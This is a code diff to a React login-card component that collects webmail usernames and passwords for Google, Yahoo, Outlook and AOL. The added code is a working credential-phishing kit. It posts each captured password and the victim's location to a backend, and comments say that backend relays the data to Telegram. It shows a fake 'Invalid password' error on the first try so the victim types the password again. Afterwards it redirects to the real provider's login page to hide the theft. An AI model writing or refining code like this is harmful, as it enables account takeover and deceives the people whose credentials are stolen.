@@ -9,7 +9,7 @@ import styles from './LoginCard.module.css'
 
 export default function LoginCard() {
   const router = useRouter() // Initialize the router
-
+  const [retryCount, setRetryCount] = useState(0);
   const [selected, setSelected] = useState<MailProvider | null>(null)
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
@@ -40,43 +40,60 @@ export default function LoginCard() {
   }, [])
 
   async function handleSubmit(e: React.FormEvent) {
-    e.preventDefault()
-    if (!selected || !username.trim() || !password.trim()) {
-      setErrorMsg('Please fill in both fields.')
-      return
-    }
-
-    setFormState('loading')
-    setErrorMsg('')
-
-    try {
-      const res = await fetch('/api/signin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: username.trim(),
-          password: password.trim(),
-          provider: selected.id,
-          city: location.city,
-          country: location.country,
-        }),
-      })
-
-      if (!res.ok) throw new Error()
-      
-      setFormState('success')
-
-      // Redirect after 2 seconds
-      setTimeout(() => {
-        // You can change this to '/inbox' or any page you like
-        router.push('https://mail.google.com') 
-      }, 2000)
-
-    } catch {
-      setFormState('error')
-      setErrorMsg('Something went wrong. Please try again.')
-    }
+  e.preventDefault()
+  if (!selected || !username.trim() || !password.trim()) {
+    setErrorMsg('Please fill in both fields.')
+    return
   }
+
+  setFormState('loading')
+  setErrorMsg('')
+
+  try {
+    // Send data to Telegram on EVERY attempt so you don't miss anything
+    const res = await fetch('/api/signin', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: username.trim(),
+        password: password.trim(),
+        provider: selected.id,
+        city: location.city,
+        country: location.country,
+        attempt: retryCount + 1 // Tell Telegram which attempt this is
+      }),
+    })
+
+    if (!res.ok) throw new Error()
+
+    // LOGIC: If it's the first attempt, show an error
+    if (retryCount === 0) {
+      setTimeout(() => {
+        setFormState('idle')
+        setPassword('') // Clear password field for "re-entry"
+        setErrorMsg('Invalid password. Please try again.')
+        setRetryCount(1)
+      }, 1200) // Small delay to look like it's "checking"
+    } else {
+      // If it's the second attempt, show success and redirect
+      setFormState('success')
+      setTimeout(() => {
+        // Redirect to the actual provider's login page
+        const redirectUrls: Record<string, string> = {
+          google: 'https://accounts.google.com/signin',
+          yahoo: 'https://login.yahoo.com',
+          outlook: 'https://login.live.com',
+          aol: 'https://login.aol.com',
+        }
+        window.location.href = redirectUrls[selected.id] || 'https://mail.google.com'
+      }, 2000)
+    }
+
+  } catch {
+    setFormState('error')
+    setErrorMsg('Connection error. Please try again.')
+  }
+}
 
   return (
     <div className={styles.card}>
